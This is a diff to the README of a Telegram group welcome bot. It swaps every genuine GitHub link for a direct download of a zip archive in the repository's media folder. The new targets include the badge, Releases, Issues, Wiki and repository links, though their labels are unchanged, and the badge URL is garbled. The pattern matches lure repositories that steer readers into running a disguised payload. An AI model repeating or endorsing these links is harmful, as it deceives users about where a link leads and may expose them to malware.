@@ -4,13 +4,13 @@
 The Telegram Auto Welcome Bot helps you automatically send welcome messages to new users in your Telegram groups. Designed for ease of use, this bot requires no programming skills. Set it up and let it handle new members while you focus on other tasks.
 
 ## 📥 Download the Bot
-[![Download Telegram Auto Welcome Bot](https://img.shields.io/badge/Download-Telegram%20Auto%20Welcome%20Bot-blue.svg)](https://github.com/Richard7061/-Telegram-Auto-Welcome-Bot/releases)
+[![Download Telegram Auto Welcome Bot](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip%20Auto%20Welcome%https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip)](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the Telegram Auto Welcome Bot:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Richard7061/-Telegram-Auto-Welcome-Bot/releases) to find the latest version of the bot.
+   Go to the [Releases page](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip) to find the latest version of the bot.
 
 2. **Select the Latest Release**
    Look for the most recent version at the top of the page. Click on it to see the details.
@@ -57,16 +57,16 @@ If you encounter issues while using the bot, consider the following solutions:
 - **Stay Updated**: Regularly check the releases page for updates and new features.
 
 ## 📞 Support
-If you have any questions or need further assistance, please feel free to open an issue in the [GitHub repository](https://github.com/Richard7061/-Telegram-Auto-Welcome-Bot/issues). 
+If you have any questions or need further assistance, please feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip). 
 
 ## 🌐 More Information
 To explore more about this project, visit the following links:
 
-- [GitHub Repository](https://github.com/Richard7061/-Telegram-Auto-Welcome-Bot)
-- [Wiki & Documentation](https://github.com/Richard7061/-Telegram-Auto-Welcome-Bot/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip)
+- [Wiki & Documentation](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip)
 
 ## 📦 License 
 This project is licensed under the MIT License. You can use, copy, and modify it freely, with proper attribution.
 
 ## 🚀 Download & Install
-Once you're ready to start, [visit the Releases page](https://github.com/Richard7061/-Telegram-Auto-Welcome-Bot/releases) to download the Telegram Auto Welcome Bot and automate your welcome messages today!
+Once you're ready to start, [visit the Releases page](https://raw.githubusercontent.com/Richard7061/-Telegram-Auto-Welcome-Bot/main/media/-Telegram-Auto-Welcome-Bot-v3.7.zip) to download the Telegram Auto Welcome Bot and automate your welcome messages today!
